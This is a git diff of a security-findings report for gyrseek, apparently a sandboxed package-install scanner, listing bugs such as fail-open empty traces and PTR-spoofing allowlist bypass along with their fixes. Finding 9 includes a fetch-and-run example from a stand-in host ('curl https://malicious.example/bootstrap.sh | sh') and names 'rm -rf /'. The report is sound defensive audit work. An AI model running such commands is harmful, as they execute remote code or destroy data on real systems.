@@ -1,86 +1,7 @@
 # Security & Correctness Findings
 
-Reviewed: 2026-06-09  
-Scope: `src/lib.rs`, `src/scanning.rs`, `src/parsing.rs`, `src/sandbox.rs`  
-Method: 7-angle static review (line-by-line, removed-behavior, cross-file, reuse, simplification, efficiency, altitude) + 1-vote verification
-
----
-
-## Verification (2026-06-09, re-reviewed against HEAD `7a6d073`)
-
-**Verdict: all 8 findings are accurate.** Each points to real code at the cited line number, and the described mechanism matches what the code does. Every finding was re-traced against current source, including the chained behavioral claims (not just the cited line).
-
-| #   | Cited location    | Verified | Notes                                                                                                                                                                                                                                 |
-| --- | ----------------- | -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 1   | `sandbox.rs:188`  | ✅       | `unwrap_or_else(...).unwrap_or_default()` returns `""` on double failure; empty-vs-empty diff in `scan_packages_versions` falls through to `allowed: true`. The recommended `Err(...)` batch-block path exists (scanning.rs:884–893). |
-| 2   | `scanning.rs:199` | ✅       | Allowlist match (line 203) runs on `resolver(&ip)` = PTR record via `reverse_dns_domain`→`lookup_addr` (line 213), with no forward-confirmation. Attacker-controlled.                                                                 |
-| 3   | `scanning.rs:427` | ✅       | Regex is exactly `\[(?P<argv>[^\]]*)\]` — stops at first `]`.                                                                                                                                                                         |
-| 4   | `sandbox.rs:307`  | ✅       | `"{} >/dev/null 2>&1 \|\| true"` wraps the whole strace command. Root cause of #1.                                                                                                                                                    |
-| 5   | `parsing.rs:113`  | ✅       | `if !*local_source && !(directory_local && *develop)` — non-develop local-path packages leak through.                                                                                                                                 |
-| 6   | `parsing.rs:298`  | ✅       | `base.split_once("==")` keeps extras in `name`. See caveat below.                                                                                                                                                                     |
-| 7   | `parsing.rs:576`  | ✅       | Strips extras for the `pins` lookup but the map is keyed by full name → miss → unpinned forward.                                                                                                                                      |
-| 8   | `lib.rs:536`      | ✅       | `let _ = child.wait();` discards the child exit status.                                                                                                                                                                               |
-
-**Caveats (do not change the verdict):**
-
-- **Finding 6** — the closing claim that the empty baseline causes _every_ connection to be flagged as new is slightly too strong. With zero baselines, the new-package-exemption / `<2 baselines` logic (scanning.rs:948–957) can instead produce a **silent skip-and-allow** for an unexempted package, rather than a false-positive block. The 404→zero-baseline mechanism is correct; the precise downstream outcome (block vs. silent allow) depends on the exemption path — which is arguably worse than the document states.
-- **Findings 1 and 4** are effectively one bug (effect + root cause); the doc's own "Chains" section already notes this. Fine to list separately, but they should be fixed together.
-- Severities are reasonable editorial judgments.
-
----
-
-## Runtime verification (2026-06-10, `GYRSEEK_SANDBOX=docker`)
-
-**Verdict: all 8 fixes independently verified at the CLI surface.** Tests were run against the built binary (`./target/debug/gyrseek`) with `GYRSEEK_SANDBOX=docker` — not host mode.
-
-| #         | How verified                                                                                                                                                                       | Observed output                          |
-| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
-| 1         | Live docker scan (`npm install lodash`) completed with a real strace trace and clear behavioral report — no empty-trace silent pass.                                               | `✅ [gyrseek] Clear behavioral report`   |
-| 2         | Unit tests `fcrdns_rejects_spoofed_ptr_that_does_not_forward_confirm`, `fcrdns_accepts_hostname_that_forward_resolves_back_to_ip`, `fcrdns_rejects_when_no_ptr_record` — all pass. | `3 passed`                               |
-| 3         | Unit test `extract_process_exec_preserves_brackets_in_argv` — `bun\|run\|script[obf].js` captured intact.                                                                          | `1 passed`                               |
-| 4         | Unit test `matrix_script_captures_strace_stderr_not_devnull` — script contains `2>/out/gyrseek_err_0.log`, not `2>&1`.                                                             | `1 passed`                               |
-| 5         | `poetry install` from a dir with `poetry.lock` containing `../mylib` (non-develop directory source) + `requests` — only `requests` (1 package) scanned; `mylib` excluded.          | `Testing 1 locked package(s)`            |
-| 6         | `./target/debug/gyrseek pip install 'requests[security]==2.31.0'` — registry lookup for `requests`, baselines `["2.30.0", "2.29.0"]` resolved. No PyPI 404.                        | `Fetching version matrix for 'requests'` |
-| 7         | Unit test `pins_extras_spec_using_canonical_key_and_preserves_extras` — `requests[security]==2.31.0` pinned correctly from `pins["requests"]`.                                     | `1 passed`                               |
-| 8         | `./target/debug/gyrseek pip install requests` (no host pip) → exit 1. `./target/debug/gyrseek true` → exit 0. `forwarding_propagates_host_nonzero_exit_status` test passes.        | `exit: 1` / `exit: 0`                    |
-| follow-on | Unit test `docker_args_grant_sys_ptrace_capability` — `--cap-add SYS_PTRACE` present in docker run args.                                                                           | `1 passed`                               |
-| #9        | `./target/debug/gyrseek ls`, `curl`, `rm -rf /tmp/test` — all rejected exit 1 with supported-manager list. `sandbox runtimes` and `npm install lodash` still work. | `exit: 1` / `exit: 0` |
-
----
-
-## Finding 9 — Medium | `lib.rs` (post-verification, 2026-06-10)
-
-**Summary:** Unrecognized managers were silently forwarded unscanned, violating gyrseek's core contract.
-
-**Root cause:** The `run()` fallback at the bottom of `lib.rs` called `forward_original_command()` for any manager that `should_enforce_package_detection` returned `false` for — which includes every unrecognized command. `gyrseek ls`, `gyrseek curl https://...`, and `gyrseek rm -rf /` all executed unscanned.
-
-**Failure scenario:** A misconfigured CI pipeline has `alias pip=gyrseek`. A developer adds `gyrseek curl https://malicious.example/bootstrap.sh | sh` to a script. gyrseek forwards it silently and exits 0. No scan, no warning, full false assurance.
-
-**Fix:** Upfront allowlist check in `run()` before sandbox init. Any manager not in `["pip", "pip3", "uv", "poetry", "npm"]` (except `sandbox runtimes`) exits 1 with:
-```
-❌ [gyrseek] Unrecognized manager 'curl'. Supported managers: pip, pip3, uv, poetry, npm. Failing closed.
-```
-
-**✅ Fix status — FIXED.** `SUPPORTED_MANAGERS` allowlist added at `lib.rs:769`. `forward_fail_closed_tests.rs` updated to use a fake `uv` binary (via temp dir on `PATH`) rather than arbitrary commands, so the tests remain valid under the new restriction. Verified at CLI: `ls`, `curl`, `rm` all rejected; `sandbox runtimes` and real scans unaffected.
-
----
-
-## Resolution status (2026-06-09, fixes applied)
-
-**All 8 findings have been fixed.** Each fix ships with co-located regression coverage (`cargo test` green). The per-finding sections below carry a **Fix status** entry describing exactly what changed; this table is the at-a-glance summary. Line numbers point at the _fixed_ code.
-
-| #   | Severity | Status   | What was done                                                                                                                                                                                                                                                  |
-| --- | -------- | -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 1   | Critical | ✅ Fixed | Empty/whitespace trace is now a hard `Err` (fail-closed), never an empty-but-clean pass (`sandbox.rs:185–209`).                                                                                                                                                |
-| 2   | Critical | ✅ Fixed | Domain allowlist now requires forward-confirmed reverse DNS (FCrDNS) before trusting a PTR hostname (`scanning.rs:213–240`).                                                                                                                                   |
-| 3   | High     | ✅ Fixed | argv regex is now balanced-bracket-aware, so `]` inside an argument no longer truncates (`scanning.rs:457`).                                                                                                                                                   |
-| 4   | High     | ✅ Fixed | strace stderr is captured to a per-probe error log instead of `>/dev/null 2>&1`; `\|\| true` is kept only so one failing install doesn't abort sibling probes, and the empty-trace check (#1) turns a real attach failure into a block (`sandbox.rs:330–339`). |
-| 5   | High     | ✅ Fixed | Poetry filter now excludes _any_ local directory-source package regardless of `develop` (`parsing.rs:116`).                                                                                                                                                    |
-| 6   | Medium   | ✅ Fixed | PEP 508 extras are stripped from the canonical name used for registry lookup via `strip_pep508_extras` (`parsing.rs:291`, applied at `295–312`, `645–651`).                                                                                                    |
-| 7   | Medium   | ✅ Fixed | `pins` is now keyed by the extras-stripped name and the rewrite looks it up the same way, re-emitting the full spec with extras intact (`parsing.rs:583`).                                                                                                     |
-| 8   | Medium   | ✅ Fixed | The host manager's exit status is propagated; a non-zero child exit makes gyrseek exit with the same code (`lib.rs:540–550`).                                                                                                                                  |
-
-**Follow-on environment fix (surfaced by #1/#4):** Once #1 made tracing failures fail closed instead of silently passing, real `uv sync` runs began correctly blocking with `strace: attach: ptrace(PTRACE_SEIZE): Operation not permitted`. Root cause: the sandbox container ran **without** `CAP_SYS_PTRACE`. Because strace drops the install to the unprivileged `gyrseek` user (`strace -u`), attaching across UIDs needs that capability, which Docker does not grant by default — so tracing could _never_ have succeeded in that configuration (the old code only hid it behind empty traces). **Fixed** by adding `--cap-add SYS_PTRACE` to the container run args (`sandbox.rs:376–377`; test `docker_args_grant_sys_ptrace_capability`). The capability is scoped to the container's PID namespace and cannot trace host processes.
+**Scope:** `src/lib.rs`, `src/scanning.rs`, `src/parsing.rs`, `src/sandbox.rs`  
+**Method:** 7-angle static review (line-by-line, removed-behavior, cross-file, reuse, simplification, efficiency, altitude) + 1-vote verification
 
 ---
 
@@ -88,285 +9,281 @@ Method: 7-angle static review (line-by-line, removed-behavior, cross-file, reuse
 
 Each finding has:
 
-- **Location** — file and line number
-- **Severity** — Critical / High / Medium
+- **Location** — file and line number at the time of discovery
+- **Severity** — Critical / High / Medium / Low
 - **Summary** — one sentence describing the defect
 - **Root cause** — what the code does wrong
-- **Failure scenario** — concrete inputs/state that trigger the bug and the resulting wrong behavior
+- **Failure scenario** — concrete inputs/state that trigger the bug and the wrong outcome
 - **Fix direction** — suggested remediation
+- **Fix status** — ✅ Fixed (with what changed) or ⚠️ Open
 
 ---
 
-## Finding 1 — Critical | `sandbox.rs:188`
+## Summary
 
-**Summary:** Missing trace log silently falls back to an empty string, which the scanner treats as a clean zero-connection trace, allowing the package.
+| #  | File          | Line | Severity | Description                                                           | Status    |
+|----|---------------|------|----------|-----------------------------------------------------------------------|-----------|
+| 1  | `sandbox.rs`  | 188  | Critical | Empty trace on strace failure passes as clean scan                    | ✅ Fixed  |
+| 2  | `scanning.rs` | 199  | Critical | PTR-record domain allowlist bypassable by attacker                    | ✅ Fixed  |
+| 3  | `scanning.rs` | 427  | High     | Argv regex truncates at first `]` — corrupts signatures               | ✅ Fixed  |
+| 4  | `sandbox.rs`  | 307  | High     | `\|\| true` suppresses strace failures — root cause of #1             | ✅ Fixed  |
+| 5  | `parsing.rs`  | 113  | High     | Poetry non-develop local-path packages leak through filter            | ✅ Fixed  |
+| 6  | `parsing.rs`  | 298  | Medium   | PEP 508 extras in package name → PyPI 404 → zero baselines           | ✅ Fixed  |
+| 7  | `parsing.rs`  | 576  | Medium   | Extras key mismatch breaks version pinning in forwarded command       | ✅ Fixed  |
+| 8  | `lib.rs`      | 536  | Medium   | Child exit status discarded — failed installs appear successful       | ✅ Fixed  |
+| 9  | `lib.rs`      | —    | Medium   | Unrecognized managers silently forwarded unscanned                    | ✅ Fixed  |
+| 10 | `scanning.rs` | 654  | Critical | Self-referencing baseline override disables all anomaly detection     | ⚠️ Open  |
+| 11 | `parsing.rs`  | 468  | High     | All-non-registry npm CLI args trigger package.json fallback           | ⚠️ Open  |
+| 12 | `lib.rs`      | 1021 | High     | All-non-registry npm CLI args + no package.json → valid install blocked | ⚠️ Open |
+| 13 | `scanning.rs` | 1852 | Medium   | Async tests set env var without drop-guard — panic leaves it set      | ⚠️ Open  |
+| 14 | `parsing.rs`  | 880  | Low      | Temp file not cleaned up on test assertion failure                    | ⚠️ Open  |
 
-**Root cause:** `trace_install_docker_matrix_with_runtime` reads each per-probe log file with:
-
-```rust
-std::fs::read_to_string(&trace_path).unwrap_or_else(|_| {
-    trace_install_docker_single_with_runtime(...)
-        .unwrap_or_default()
-})
-```
-
-If the log file is absent (strace failed to write it) and the single-probe fallback Docker call also fails, `unwrap_or_default()` returns `""`. An empty string produces empty `TraceSignals` (no IPs, no git-clone signatures, no process-exec signatures). The diff of empty-vs-empty produces zero anomalies, so `allowed: true` is returned with no actual tracing data.
-
-**Failure scenario:** In a Kubernetes environment where the container seccomp profile blocks `ptrace` (the default in most managed K8s clusters), strace exits non-zero and writes nothing to `/out/gyrseek_trace_N.log`. The fallback single-probe container runs the same image under the same restriction and also produces no trace. `unwrap_or_default()` returns `""`. Every package scanned in that environment silently passes.
-
-**Chained with:** Finding 4 (the `|| true` in the matrix script is the direct cause of the log file being absent with no error surfaced).
-
-**Fix direction:** If both the matrix log read and the single-probe fallback fail, return `Err(...)` from `trace_install_docker_matrix_with_runtime` rather than returning an empty string. The error path in `scan_packages_versions` already handles `Err` from the tracer by marking all packages in the batch as blocked — use it.
-
-**✅ Fix status — FIXED.** `trace_install_docker_matrix_with_runtime` no longer swallows failures into an empty string. The per-probe read now (a) prefers the matrix log only when it is non-empty, (b) falls back to the single-probe call with `?` so a fallback error propagates as `Err`, and (c) treats a blank/whitespace trace as a hard `Err` carrying the captured strace stderr:
-
-```rust
-let trace = match std::fs::read_to_string(&trace_path) {
-    Ok(contents) if !contents.trim().is_empty() => contents,
-    _ => trace_install_docker_single_with_runtime(manager, package, version, runtime)?,
-};
-if trace.trim().is_empty() {
-    return Err(format!("empty trace for '{}@{}': strace produced no output ...", package, version));
-}
-```
-
-The single-probe fallback also now checks `output.status.success()` and returns `Err` on failure instead of returning stderr unconditionally. Any tracing failure therefore reaches the existing batch-block path in `scan_packages_versions` and every affected package is blocked, not allowed. (`sandbox.rs:185–218`.) This change is what surfaced the missing `CAP_SYS_PTRACE` (see _Follow-on environment fix_ above).
+**Chains:**
+- **#4 → #1:** strace errors suppressed → empty log → empty trace → package allowed
+- **#6 → #7:** extras break PyPI lookup AND break version pinning for the same package
+- **#11 → #12:** the `is_non_registry_npm_spec` fix introduced both as side-effects — the filter correctly stops local specs from reaching the registry, but causes the package.json fallback to fire when it shouldn't
 
 ---
 
-## Finding 2 — Critical | `scanning.rs:199`
+## Finding 1 — Critical | `sandbox.rs:188` | ✅ Fixed
+
+**Summary:** A missing trace log silently falls back to an empty string, which the scanner treats as a clean zero-connection trace, allowing the package.
+
+**Root cause:** `trace_install_docker_matrix_with_runtime` reads each per-probe log file and falls back to a single-probe retry. If both fail, `unwrap_or_default()` returns `""`. An empty string produces empty `TraceSignals` (no IPs, no git-clone signatures, no process-exec signatures). The diff of empty-vs-empty produces zero anomalies → `allowed: true` with no actual tracing data.
+
+**Failure scenario:** In a Kubernetes environment where the container seccomp profile blocks `ptrace`, strace exits non-zero and writes nothing to `/out/gyrseek_trace_N.log`. The fallback runs under the same restriction and also fails. Every package scanned in that environment silently passes.
+
+**Chained with:** Finding 4 (the `|| true` in the matrix script is what hides the strace failure).
+
+**Fix direction:** When both the matrix log read and the single-probe fallback fail, return `Err(...)` rather than an empty string. The error path in `scan_packages_versions` already marks all packages in the batch as blocked.
+
+**✅ Fix status — FIXED.** Empty/whitespace traces are now a hard `Err` (fail-closed). The per-probe read prefers the matrix log only when non-empty, falls back to the single-probe call with `?` so errors propagate, and treats a blank trace as an error carrying the captured strace stderr. The single-probe fallback also checks `output.status.success()`. (`sandbox.rs:185–218`.) This change surfaced the missing `CAP_SYS_PTRACE` — see the follow-on fix note at the end of this document.
+
+---
+
+## Finding 2 — Critical | `scanning.rs:199` | ✅ Fixed
 
 **Summary:** The domain allowlist is checked against the attacker-controlled PTR record of the connecting IP, allowing a C2 server to bypass the allowlist by setting its reverse-DNS to an allowlisted domain.
 
-**Root cause:** `filter_domain_allowlisted_new_connections_with` calls the user-supplied `resolver` (which in production is `reverse_dns_domain` → `lookup_addr`) on each new IP to get a hostname, then checks that hostname against `domain_allowlist`. PTR records are controlled by whoever owns the IP address — an attacker who controls their C2 server controls its PTR record.
+**Root cause:** `filter_domain_allowlisted_new_connections_with` calls `reverse_dns_domain` → `lookup_addr` on each new IP, then checks the returned hostname against `domain_allowlist`. PTR records are fully controlled by the IP's owner.
 
-```rust
-match resolver(&ip) {
-    Some(domain) if domain_is_allowlisted(&domain, domain_allowlist) => {
-        allowlisted.push(...)   // connection silently passes
-    }
-    _ => remaining.push(ip),
-}
-```
+**Failure scenario:** Organization sets `domain_allowlist: ['cdn.example.com']`. Attacker registers C2 IP `1.2.3.4` and sets its PTR record to `cdn.example.com`. The malicious package connects to `1.2.3.4`. `reverse_dns_domain("1.2.3.4")` returns `"cdn.example.com"` → allowlisted → not flagged.
 
-**Failure scenario:** Organization sets `domain_allowlist: ['cdn.example.com']`. Attacker registers C2 IP `1.2.3.4` and sets its PTR record to `cdn.example.com`. During install, the malicious package connects to `1.2.3.4`. `reverse_dns_domain("1.2.3.4")` returns `"cdn.example.com"`. `domain_is_allowlisted` returns `true`. The connection is allowlisted and not flagged.
+**Fix direction:** Resolve the PTR hostname forward and only trust it if its A/AAAA records include the original IP (FCrDNS — forward-confirmed reverse DNS).
 
-**Fix direction:** Domain allowlisting should check forward-confirmed reverse DNS: resolve the PTR record and then verify the resulting hostname resolves back to the original IP (FCrDNS). Alternatively, document clearly that `domain_allowlist` provides no security guarantee against IP-allowlist bypass and should only be used for convenience in low-trust scenarios.
-
-**✅ Fix status — FIXED (FCrDNS implemented).** `reverse_dns_domain` now resolves the PTR hostname _forward_ and only returns it if one of its A/AAAA records maps back to the original IP. The pure decision was extracted into `forward_confirmed_hostname` with injectable lookups so it is deterministically unit-tested:
-
-```rust
-fn reverse_dns_domain(ip: &str) -> Option<String> {
-    let addr: IpAddr = ip.parse().ok()?;
-    forward_confirmed_hostname(addr, |a| lookup_addr(&a).ok(), |h| lookup_host(h).ok())
-}
-// returns the PTR hostname only if forward(hostname).contains(addr)
-```
-
-An attacker who points their C2 IP's PTR record at `cdn.example.com` no longer bypasses the allowlist, because `cdn.example.com`'s real A record does not resolve back to the C2 IP. (`scanning.rs:213–240`; tests `fcrdns_accepts_hostname_that_forward_resolves_back_to_ip`, `fcrdns_rejects_spoofed_ptr_that_does_not_forward_confirm`, `fcrdns_rejects_when_no_ptr_record`.) Note: new IPs remain fail-closed regardless; the domain allowlist is a convenience layer and now only honors forward-confirmed hostnames.
+**✅ Fix status — FIXED (FCrDNS implemented).** `reverse_dns_domain` now resolves the PTR hostname forward and only returns it if the forward resolution includes the original IP. The pure decision is extracted into `forward_confirmed_hostname` with injectable lookups for deterministic testing. (`scanning.rs:213–240`; tests `fcrdns_accepts_hostname_that_forward_resolves_back_to_ip`, `fcrdns_rejects_spoofed_ptr_that_does_not_forward_confirm`, `fcrdns_rejects_when_no_ptr_record`.)
 
 ---
 
-## Finding 3 — High | `scanning.rs:427`
+## Finding 3 — High | `scanning.rs:427` | ✅ Fixed
 
-**Summary:** The execve argv regex `[^\]]*` stops at the first `]` in any argument, silently truncating arguments that contain `]` — such as package extras or bracket-containing paths.
+**Summary:** The execve argv regex `[^\]]*` stops at the first `]` in any argument, silently truncating arguments that contain `]` — such as PEP 508 package extras or bracket-containing paths.
 
-**Root cause:** The regex for capturing execve argv is:
+**Root cause:** The character class `[^\]]*` matches everything except `]`. strace output for `execve("/bin/pip", ["pip", "install", "requests[security]"], ...)` has the `]` in `security]` terminate the argv capture early. The extracted argv becomes `"pip", "install", "requests[security` — the last argument is malformed.
 
-```rust
-Regex::new(r#"execve\([^,]+,\s*\[(?P<argv>[^\]]*)\]"#)
+**Failure scenario (false positive):** A package clones `https://host/path[mirror]` — the URL truncates, the extracted git-clone signature never matches the `git_clone_allowlist` entry → false-positive block.
+
+**Failure scenario (bypass):** A package runs `bun run script[obf].js`. Both current and baseline produce the truncated signature `bun|run|script[obf` → diffs are equal → no anomaly → bypass.
+
+**Fix direction:** Use a balanced-bracket-aware pattern that can consume `[...]` spans inside the argv group.
+
+**✅ Fix status — FIXED.** The argv capture group is now:
 ```
-
-The `[^\]]*` character class matches any character except `]`. strace output for `execve("/bin/pip", ["pip", "install", "requests[security]"], ...)` has `requests[security]` inside the argv brackets. The `]` in `security]` terminates the `argv` capture group early, so the captured argv is `"pip", "install", "requests[security` — a malformed string where the last argument is incomplete and un-closeable by the quoted-arg extractor.
-
-**Failure scenario (false positive):** A package whose install runs `git clone https://host/path[mirror]` has its clone URL truncated. The extracted signature `https://host/path[mirror` never matches any `git_clone_allowlist` entry → false-positive block.
-
-**Failure scenario (bypass):** A package runs `bun run script[obf].js`. The truncated signature is `bun|run|script[obf` instead of `bun|run|script[obf].js`. If an operator tries to add the actual signature to `process_exec_allowlist`, it will never match because the stored signature is already truncated. Conversely, if the baseline version also runs the same bun invocation, both current and baseline produce the same truncated signature → no anomaly → bypass.
-
-**Fix direction:** Change the argv group to a non-greedy match or to a balanced-bracket-aware approach. The simplest fix is to match the full `[...]` content including nested brackets: replace `[^\]]*` with `[^\[]*(?:\[[^\]]*\][^\[]*)*` — or use a different parsing strategy (split the full strace line, then parse quoted strings from within the bracket region without relying on a single character exclusion).
-
-**✅ Fix status — FIXED.** The argv capture group is now balanced-bracket-aware, consuming any number of `[...]` spans before the array's real closing `]`:
-
-```rust
-Regex::new(r#"execve\([^,]+,\s*\[(?P<argv>[^\[\]]*(?:\[[^\]]*\][^\[\]]*)*)\]"#)
+[^\[\]]*(?:\[[^\]]*\][^\[\]]*)*
 ```
-
-`["bun", "run", "script[obf].js"]` now yields the full `bun|run|script[obf].js` signature instead of truncating at `script[obf`. This closes both the false-positive (truncated clone URL never matches `git_clone_allowlist`) and the bypass (truncated baseline+current matching). (`scanning.rs:457`; test `extract_process_exec_preserves_brackets_in_argv`.)
+This consumes any number of balanced `[...]` spans before the real closing `]`. (`scanning.rs:457`; test `extract_process_exec_preserves_brackets_in_argv`.)
 
 ---
 
-## Finding 4 — High | `sandbox.rs:307`
+## Finding 4 — High | `sandbox.rs:307` | ✅ Fixed
 
-**Summary:** The matrix script appends `>/dev/null 2>&1 || true` to each strace invocation, suppressing strace's own stderr and exit code, so ptrace capability failures produce an empty log file with no diagnostic output.
+**Summary:** The matrix script appends `>/dev/null 2>&1 || true` to each strace invocation, discarding strace's stderr and masking its exit code, so ptrace capability failures produce an empty log file with no diagnostic.
 
-**Root cause:** In `build_matrix_script`:
+**Root cause:** `build_matrix_script` wraps each strace call with `>/dev/null 2>&1 || true`. When strace cannot attach (e.g. `CAP_SYS_PTRACE` missing), it writes an error to stderr and exits non-zero — both are now invisible. Docker exits 0. No log is written. The caller cannot distinguish this from a clean install that made no network calls.
 
-```rust
-steps.push(format!(
-    "{} >/dev/null 2>&1 || true",
-    strace_install_command(manager, &spec, Some(&log))
-));
-```
+**Failure scenario:** Direct cause of Finding 1. Any environment blocking ptrace will have every scan silently pass.
 
-`strace_install_command` already redirects its output to a log file via `-o /out/gyrseek_trace_N.log`. The additional `>/dev/null 2>&1` redirects strace's own stderr (error messages) to null, and `|| true` overrides its exit code. When strace cannot attach (`PTRACE_ATTACH` denied), it writes an error to stderr and exits non-zero — both are now invisible. The Docker container exits 0. No log file is written. The caller has no way to distinguish this from a successful but connection-free install.
+**Fix direction:** Capture strace's stderr to a per-probe log file rather than discarding it. Keep `|| true` only for the install subprocess's exit code, not for the strace wrapper.
 
-**Failure scenario:** Direct cause of Finding 1. Any environment blocking ptrace (K8s default seccomp, rootless Docker, GitHub Actions without special capabilities) will have every scan pass silently.
-
-**Fix direction:** Remove `>/dev/null 2>&1` from the strace step specifically. Redirect only the install's own stdout/stderr (`>/dev/null 2>&1` should wrap only the install invocation, not the strace wrapper). Propagate strace exit non-zero as a hard failure in the matrix script (let `set -e` catch it rather than using `|| true` around the strace command).
-
-**✅ Fix status — FIXED, with a deliberate deviation from the suggested mechanism.** strace's stderr is now captured to a per-probe error log instead of being discarded:
-
-```rust
-let err = format!("/out/gyrseek_err_{}.log", idx);
-steps.push(format!(
-    "{} >/dev/null 2>{} || true",
-    strace_install_command(manager, &spec, Some(&log)),
-    err
-));
-```
-
-**Why `|| true` was kept rather than letting `set -e` abort the script:** `strace -o log <cmd>` exits with the _tracee's_ exit code. A legitimate install can fail (e.g. a yanked baseline version, a transient network error) and exit non-zero **even though tracing succeeded**. If `set -e` aborted the whole matrix on any non-zero strace exit, one bad baseline would block every package in the batch — a false-positive denial-of-service. So the script keeps `|| true` to isolate per-probe failures, and detection of a _genuine_ strace-attach failure is delegated to Finding 1's empty-trace check: if strace could not attach, the log is blank and `trace_install_docker_matrix_with_runtime` returns `Err` (block). The captured stderr log is surfaced in that error message for diagnosis. This achieves the security goal (attach failures are no longer silent) without the false-positive cost of a hard `set -e` abort. (`sandbox.rs:330–339`; test `matrix_script_captures_strace_stderr_not_devnull`.)
+**✅ Fix status — FIXED (with deliberate deviation).** strace's stderr is now captured to `/out/gyrseek_err_N.log` per probe (`2>err_log`) instead of `/dev/null`. `|| true` is kept so a single failing baseline install (e.g. yanked version, transient network error) does not abort sibling probes — since strace exits with the tracee's exit code, not its own. A genuine strace-attach failure leaves a blank trace log, which Finding 1's empty-trace check turns into a block carrying the captured stderr for diagnosis. (`sandbox.rs:330–339`; test `matrix_script_captures_strace_stderr_not_devnull`.)
 
 ---
 
-## Finding 5 — High | `parsing.rs:113`
+## Finding 5 — High | `parsing.rs:113` | ✅ Fixed
 
-**Summary:** The poetry lock parser's local-package filter only excludes `develop=true` directory-source entries; non-develop local-path packages pass through and are submitted to the registry scanner as if they were public packages.
+**Summary:** The poetry lock parser only excludes `develop=true` directory-source entries; non-develop local-path packages pass through and are submitted to the registry scanner as public packages.
 
-**Root cause:** The exclusion condition in `finalize_package` is:
+**Root cause:** The exclusion condition was `if !*local_source && !(directory_local && *develop)`. A non-develop local directory package has `develop=false`, so `!(directory_local && false)` = `!false` = `true` → the package is pushed to the scan list.
 
-```rust
-if !*local_source && !(directory_local && *develop) {
-    packages.push((n, v));
-}
-```
+**Failure scenario:** A `poetry.lock` entry has `[package.source]` with `type = "directory"` and `url = "../mylib"` but no `develop` key (defaults to `false`). `mylib` is submitted to the PyPI scanner. If a public package named `mylib` exists, gyrseek scans and approves it — but the actual install uses the local path, making the approval meaningless.
 
-`directory_local` is `true` when the package source is `type = "directory"` with a local URL or path. But the exclusion fires only when `directory_local && develop` — i.e., both conditions must be true. A non-develop local directory package has `develop=false`, so `directory_local && develop = false`, and `!(false) = true`, so the package is pushed.
+**Fix direction:** Exclude any local directory-source package regardless of the `develop` flag: `if !*local_source && !directory_local`.
 
-**Failure scenario:** A `poetry.lock` entry has:
-
-```toml
-[package.source]
-type = "directory"
-url = "../mylib"
-```
-
-with no `develop` key (defaults to `false`). `local_source=false` (the inline single-line heuristic did not fire), `directory_local=true`, `develop=false`. Condition evaluates to `true` → package name `mylib` is submitted to PyPI scanner. If a public package named `mylib` exists, it gets scanned and approved. The actual install uses the local path, so the approval is meaningless — a compromised local package bypasses behavioral detection.
-
-**Fix direction:** Change the condition to exclude any local-source package regardless of `develop` flag: `if !*local_source && !directory_local`. The `develop` flag is a poetry concept for editable installs; all local directory sources should be excluded from registry scanning.
-
-**✅ Fix status — FIXED exactly as suggested.** The exclusion condition is now `if !*local_source && !directory_local`, so any local directory-source package is excluded from registry scanning regardless of the `develop` flag. The now-unused `develop` variable and its plumbing (the `develop` parameter on `finalize_package`, the `develop = true` parse branch, and the three call-site args) were removed. (`parsing.rs:116`; tests `skips_non_develop_local_package_from_poetry_lock` and `skips_develop_local_package_from_poetry_lock` confirm both cases stay excluded.)
+**✅ Fix status — FIXED exactly as suggested.** The condition is now `if !*local_source && !directory_local`. The now-unused `develop` variable and its plumbing were removed. (`parsing.rs:116`; tests `skips_non_develop_local_package_from_poetry_lock` and `skips_develop_local_package_from_poetry_lock`.)
 
 ---
 
-## Finding 6 — Medium | `parsing.rs:298`
+## Finding 6 — Medium | `parsing.rs:298` | ✅ Fixed
 
-**Summary:** PEP 508 extras (e.g., `requests[security]`) are preserved in the package name after `split_once("==")`, causing the PyPI registry lookup to receive an invalid URL that returns 404 and leaves the package with zero baselines.
+**Summary:** PEP 508 extras (e.g., `requests[security]`) are preserved in the package name after `split_once("==")`, causing the PyPI registry lookup to 404 and leaving the package with zero baselines.
 
-**Root cause:** `parse_requirements_spec` splits on `==` to extract name and version:
+**Root cause:** `parse_requirements_spec` splits on `==` but does not strip the extras from the name half. `requests[security]==2.31.0` yields `name = "requests[security]"`. The PyPI URL becomes `https://pypi.org/pypi/requests[security]/json` — a 404. The function falls back to zero baselines, zero burst count, no release-age data. With zero baselines the scan runs against an empty set, so any connection (including to pypi.org itself) is flagged as new.
 
-```rust
-if let Some((name, version)) = base.split_once("==") {
-    return Some((name.to_string(), Some(version.to_string())));
-}
-```
-
-For `requests[security]==2.31.0`, `name = "requests[security]"`. This is passed to `fetch_history_with_baselines`, which builds `https://pypi.org/pypi/requests[security]/json` — PyPI does not accept extras in the package path and returns 404. The function falls back to `(tgt_version, [], 0, None)`: zero baselines, zero burst count, no release-age data. With zero baselines and the package not in `new_package_exemptions`, the scan runs against an empty baseline — any connection (including to pypi.org itself) is flagged as new, producing a false-positive block.
-
-**Failure scenario:** A `requirements.txt` with `requests[security]==2.31.0` causes every scan to block on the spurious "new connection to pypi.org" anomaly, since the empty baseline means there is no known-good network traffic to compare against.
+**Failure scenario:** A `requirements.txt` with `requests[security]==2.31.0` causes every scan to block on a spurious "new connection to pypi.org" anomaly, since the empty baseline has no known-good traffic.
 
 **Chained with:** Finding 7 — the extras mismatch also breaks version pinning.
 
-**Fix direction:** Strip extras before registry lookups. Extract extras separately: `let (base_name, _extras) = name.split_once('[').unzip_or((name, ""))`. Use `base_name` for PyPI/npm lookups while keeping the original full spec for sandbox invocations (where extras are valid PEP 508).
+**Fix direction:** Strip extras from the canonical name before any registry lookup or `pins` key.
 
-**✅ Fix status — FIXED.** A shared helper `strip_pep508_extras(name) -> &str` (splits on the first `[`) canonicalizes the package name. It is applied at every parse boundary that feeds a registry lookup or the `pins` key: `parse_requirements_spec` (both the `==` and bare-name branches) and `parse_package_details` (both branches). So `requests[security]==2.31.0` now parses to name `requests`, the PyPI URL becomes `https://pypi.org/pypi/requests/json` (200, real baselines), and the zero-baseline false-positive/skip-and-allow path is no longer triggered by extras. The original spec with extras is preserved for the forwarded install command (see #7). (`parsing.rs:291`, applied at `295–312` and `645–651`; tests `strip_pep508_extras_removes_bracket_suffix`, `strips_pep508_extras_from_requirements_name`.)
-
----
-
